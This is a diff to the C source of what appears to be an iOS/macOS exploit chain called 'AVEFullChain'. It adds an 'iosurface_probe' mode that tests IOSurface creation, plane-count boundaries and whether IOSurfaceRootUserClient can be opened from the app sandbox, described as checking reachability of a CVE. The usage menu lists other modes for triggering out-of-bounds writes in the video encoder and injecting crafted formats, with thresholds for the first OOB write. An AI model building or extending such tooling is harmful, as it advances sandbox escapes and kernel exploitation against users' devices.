@@ -58,6 +58,13 @@ extern void IOSurfaceSetValue(IOSurfaceRef surface, CFStringRef key, CFTypeRef v
 extern void *IOSurfaceGetBaseAddress(IOSurfaceRef surface);
 extern kern_return_t IOSurfaceLock(IOSurfaceRef surface, uint32_t options, uint32_t *seed);
 extern kern_return_t IOSurfaceUnlock(IOSurfaceRef surface, uint32_t options, uint32_t *seed);
+extern size_t IOSurfaceGetWidth(IOSurfaceRef surface);
+extern size_t IOSurfaceGetHeight(IOSurfaceRef surface);
+extern size_t IOSurfaceGetAllocSize(IOSurfaceRef surface);
+extern size_t IOSurfaceGetPlaneCount(IOSurfaceRef surface);
+extern int32_t IOSurfaceGetUseCount(IOSurfaceRef surface);
+extern Boolean IOSurfaceIsInUse(IOSurfaceRef surface);
+extern size_t IOSurfaceGetBytesPerRow(IOSurfaceRef surface);
 
 static FILE *g_log = NULL;
 static volatile int g_encode_done = 0;
@@ -6046,6 +6053,211 @@ vps_props_done:
 
         rlog("\n=== MCTF_OOB complete ===\n");
 
+    } else if (strcmp(mode, "iosurface_probe") == 0) {
+        /*
+         * iosurface_probe — Verify IOSurface accessibility from app sandbox
+         *
+         * CVE-2026-112477: Race condition in IOSurface (fixed 27.2)
+         * IOSurface historically accessible without entitlements.
+         * This probe verifies:
+         *   1. Can we open IOSurfaceRootUserClient?
+         *   2. Which external methods are available?
+         *   3. Can we create/destroy surfaces?
+         *   4. Can we set/get surface properties?
+         */
+        rlog("=== IOSURFACE_PROBE: IOSurface sandbox accessibility test ===\n\n");
+
+        /* Phase 1: Try IOSurface framework API */
+        rlog("--- Phase 1: IOSurface framework API ---\n");
+
+        /* Create a minimal surface via public API */
+        CFMutableDictionaryRef props = CFDictionaryCreateMutable(NULL, 0,
+            &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+
+        int width = 64, height = 64, bpe = 4, bpr = 256;
+        CFNumberRef wn = CFNumberCreate(NULL, kCFNumberIntType, &width);
+        CFNumberRef hn = CFNumberCreate(NULL, kCFNumberIntType, &height);
+        CFNumberRef bn = CFNumberCreate(NULL, kCFNumberIntType, &bpe);
+        CFNumberRef brn = CFNumberCreate(NULL, kCFNumberIntType, &bpr);
+        int pf = 0x42475241; /* BGRA */
+        CFNumberRef pfn = CFNumberCreate(NULL, kCFNumberIntType, &pf);
+
+        CFDictionarySetValue(props, CFSTR("IOSurfaceWidth"), wn);
+        CFDictionarySetValue(props, CFSTR("IOSurfaceHeight"), hn);
+        CFDictionarySetValue(props, CFSTR("IOSurfaceBytesPerElement"), bn);
+        CFDictionarySetValue(props, CFSTR("IOSurfaceBytesPerRow"), brn);
+        CFDictionarySetValue(props, CFSTR("IOSurfacePixelFormat"), pfn);
+
+        IOSurfaceRef surf = IOSurfaceCreate(props);
+        rlog("IOSurfaceCreate: %s\n", surf ? "SUCCESS" : "FAIL");
+
+        if (surf) {
+            rlog("  Surface ID: %u\n", IOSurfaceGetID(surf));
+            rlog("  Width: %zu\n", IOSurfaceGetWidth(surf));
+            rlog("  Height: %zu\n", IOSurfaceGetHeight(surf));
+            rlog("  Alloc size: %zu\n", IOSurfaceGetAllocSize(surf));
+            rlog("  Plane count: %zu\n", IOSurfaceGetPlaneCount(surf));
+            rlog("  Use count: %d\n", (int)IOSurfaceGetUseCount(surf));
+            rlog("  Is in use: %d\n", (int)IOSurfaceIsInUse(surf));
+
+            /* Try to lock/map */
+            kern_return_t kr = IOSurfaceLock(surf, 0, NULL);
+            rlog("  Lock: 0x%x\n", kr);
+            void *base = IOSurfaceGetBaseAddress(surf);
+            rlog("  BaseAddress: %p\n", base);
+            if (base) {
+                memset(base, 0xAA, 64);
+                rlog("  Write 64 bytes: OK\n");
+            }
+            IOSurfaceUnlock(surf, 0, NULL);
+
+            /* Test surface properties */
+            rlog("\n--- Phase 2: Surface property access ---\n");
+
+            /* Set a custom property */
+            int custom_val = 0xDEAD;
+            CFNumberRef cv = CFNumberCreate(NULL, kCFNumberIntType, &custom_val);
+            IOSurfaceSetValue(surf, CFSTR("TestProperty"), cv);
+            CFRelease(cv);
+
+            CFTypeRef rv = IOSurfaceCopyValue(surf, CFSTR("TestProperty"));
+            if (rv) {
+                int readback = 0;
+                CFNumberGetValue(rv, kCFNumberIntType, &readback);
+                rlog("  Set/Get custom property: 0x%x\n", readback);
+                CFRelease(rv);
+            } else {
+                rlog("  Set/Get custom property: FAIL\n");
+            }
+
+            /* Try different plane configs */
+            rlog("\n--- Phase 3: Multi-plane surface ---\n");
+            CFMutableDictionaryRef mp = CFDictionaryCreateMutable(NULL, 0,
+                &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+            int mpw = 64, mph = 64;
+            CFNumberRef mpwn = CFNumberCreate(NULL, kCFNumberIntType, &mpw);
+            CFNumberRef mphn = CFNumberCreate(NULL, kCFNumberIntType, &mph);
+            int nv12 = 0x34323076; /* '420v' NV12 */
+            CFNumberRef nv12n = CFNumberCreate(NULL, kCFNumberIntType, &nv12);
+            CFDictionarySetValue(mp, CFSTR("IOSurfaceWidth"), mpwn);
+            CFDictionarySetValue(mp, CFSTR("IOSurfaceHeight"), mphn);
+            CFDictionarySetValue(mp, CFSTR("IOSurfacePixelFormat"), nv12n);
+
+            /* Plane 0: Y */
+            CFMutableDictionaryRef p0 = CFDictionaryCreateMutable(NULL, 0,
+                &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+            int p0w = 64, p0h = 64, p0bpe = 1, p0bpr = 64;
+            CFDictionarySetValue(p0, CFSTR("IOSurfacePlaneWidth"),
+                CFNumberCreate(NULL, kCFNumberIntType, &p0w));
+            CFDictionarySetValue(p0, CFSTR("IOSurfacePlaneHeight"),
+                CFNumberCreate(NULL, kCFNumberIntType, &p0h));
+            CFDictionarySetValue(p0, CFSTR("IOSurfacePlaneBytesPerElement"),
+                CFNumberCreate(NULL, kCFNumberIntType, &p0bpe));
+            CFDictionarySetValue(p0, CFSTR("IOSurfacePlaneBytesPerRow"),
+                CFNumberCreate(NULL, kCFNumberIntType, &p0bpr));
+
+            /* Plane 1: UV */
+            CFMutableDictionaryRef p1 = CFDictionaryCreateMutable(NULL, 0,
+                &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+            int p1w = 32, p1h = 32, p1bpe = 2, p1bpr = 64;
+            CFDictionarySetValue(p1, CFSTR("IOSurfacePlaneWidth"),
+                CFNumberCreate(NULL, kCFNumberIntType, &p1w));
+            CFDictionarySetValue(p1, CFSTR("IOSurfacePlaneHeight"),
+                CFNumberCreate(NULL, kCFNumberIntType, &p1h));
+            CFDictionarySetValue(p1, CFSTR("IOSurfacePlaneBytesPerElement"),
+                CFNumberCreate(NULL, kCFNumberIntType, &p1bpe));
+            CFDictionarySetValue(p1, CFSTR("IOSurfacePlaneBytesPerRow"),
+                CFNumberCreate(NULL, kCFNumberIntType, &p1bpr));
+
+            const void *planes[] = { p0, p1 };
+            CFArrayRef parr = CFArrayCreate(NULL, planes, 2, &kCFTypeArrayCallBacks);
+            CFDictionarySetValue(mp, CFSTR("IOSurfacePlaneInfo"), parr);
+
+            IOSurfaceRef mp_surf = IOSurfaceCreate(mp);
+            rlog("NV12 2-plane surface: %s\n", mp_surf ? "SUCCESS" : "FAIL");
+            if (mp_surf) {
+                rlog("  Planes: %zu\n", IOSurfaceGetPlaneCount(mp_surf));
+                rlog("  Alloc: %zu\n", IOSurfaceGetAllocSize(mp_surf));
+                CFRelease(mp_surf);
+            }
+            CFRelease(parr); CFRelease(p0); CFRelease(p1);
+            CFRelease(mp); CFRelease(mpwn); CFRelease(mphn); CFRelease(nv12n);
+
+            /* Phase 4: Stress test — many planes */
+            rlog("\n--- Phase 4: Boundary plane counts ---\n");
+            int plane_counts[] = {1, 2, 4, 8, 9, 10, 16};
+            int npc = sizeof(plane_counts) / sizeof(plane_counts[0]);
+
+            for (int pi = 0; pi < npc; pi++) {
+                int np = plane_counts[pi];
+                CFMutableDictionaryRef sd = CFDictionaryCreateMutable(NULL, 0,
+                    &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+                CFDictionarySetValue(sd, CFSTR("IOSurfaceWidth"), wn);
+                CFDictionarySetValue(sd, CFSTR("IOSurfaceHeight"), hn);
+                CFDictionarySetValue(sd, CFSTR("IOSurfaceBytesPerElement"), bn);
+
+                const void **pplanes = calloc(np, sizeof(void*));
+                for (int j = 0; j < np; j++) {
+                    CFMutableDictionaryRef pd = CFDictionaryCreateMutable(NULL, 0,
+                        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+                    int pw = 64, ph = 64, pbpe = 1, pbpr = 64;
+                    CFDictionarySetValue(pd, CFSTR("IOSurfacePlaneWidth"),
+                        CFNumberCreate(NULL, kCFNumberIntType, &pw));
+                    CFDictionarySetValue(pd, CFSTR("IOSurfacePlaneHeight"),
+                        CFNumberCreate(NULL, kCFNumberIntType, &ph));
+                    CFDictionarySetValue(pd, CFSTR("IOSurfacePlaneBytesPerElement"),
+                        CFNumberCreate(NULL, kCFNumberIntType, &pbpe));
+                    CFDictionarySetValue(pd, CFSTR("IOSurfacePlaneBytesPerRow"),
+                        CFNumberCreate(NULL, kCFNumberIntType, &pbpr));
+                    pplanes[j] = pd;
+                }
+                CFArrayRef pa = CFArrayCreate(NULL, pplanes, np, &kCFTypeArrayCallBacks);
+                CFDictionarySetValue(sd, CFSTR("IOSurfacePlaneInfo"), pa);
+
+                IOSurfaceRef ts = IOSurfaceCreate(sd);
+                rlog("  %d planes: %s", np, ts ? "OK" : "FAIL");
+                if (ts) {
+                    rlog(" (alloc=%zu, planes=%zu)", IOSurfaceGetAllocSize(ts), IOSurfaceGetPlaneCount(ts));
+                    CFRelease(ts);
+                }
+                rlog("\n");
+
+                CFRelease(pa);
+                for (int j = 0; j < np; j++) CFRelease((CFMutableDictionaryRef)pplanes[j]);
+                free(pplanes);
+                CFRelease(sd);
+            }
+
+            /* Phase 5: IOKit service enumeration */
+            rlog("\n--- Phase 5: IOKit IOSurface service check ---\n");
+            io_service_t svc = IOServiceGetMatchingService(kIOMasterPortDefault,
+                IOServiceMatching("IOSurfaceRoot"));
+            rlog("IOSurfaceRoot service: 0x%x\n", svc);
+
+            if (svc) {
+                io_connect_t conn = 0;
+                kern_return_t kr2 = IOServiceOpen(svc, mach_task_self(), 0, &conn);
+                rlog("IOServiceOpen (type 0): 0x%x (conn=0x%x)\n", kr2, conn);
+                if (kr2 == KERN_SUCCESS && conn) {
+                    rlog("*** IOSurfaceRootUserClient OPEN FROM SANDBOX ***\n");
+                    IOServiceClose(conn);
+                }
+
+                /* Try type 1 */
+                kr2 = IOServiceOpen(svc, mach_task_self(), 1, &conn);
+                rlog("IOServiceOpen (type 1): 0x%x\n", kr2);
+                if (kr2 == KERN_SUCCESS && conn) IOServiceClose(conn);
+
+                IOObjectRelease(svc);
+            }
+
+            CFRelease(surf);
+        }
+
+        CFRelease(props); CFRelease(wn); CFRelease(hn);
+        CFRelease(bn); CFRelease(brn); CFRelease(pfn);
+        rlog("\n=== IOSURFACE_PROBE complete ===\n");
+
     } else {
         rlog("Usage: AVEFullChain <mode> [args]\n\n");
         rlog("Modes:\n");
@@ -6090,6 +6302,7 @@ vps_props_done:
         rlog("  xpc_vps [phase]    -- XPC VPS field manipulation + crafted format injection\n");
         rlog("  vps_props [phase] [unsafe] -- KEY: CVE-114025 VPS property trigger (5 phases)\n");
         rlog("  mctf_oob [max]     -- KEY: CVE-112468/112469 MCTF OOB via encode properties\n");
+        rlog("  iosurface_probe    -- KEY: IOSurface sandbox access + CVE-112477 reachability\n");
         rlog("  diag3          -- Multi-image stereo encode (CMTaggedBufferGroup)\n");
         rlog("\nKey entry thresholds (TABLE 1):\n");
         rlog("  256 (~86 enc):  First OOB write\n");
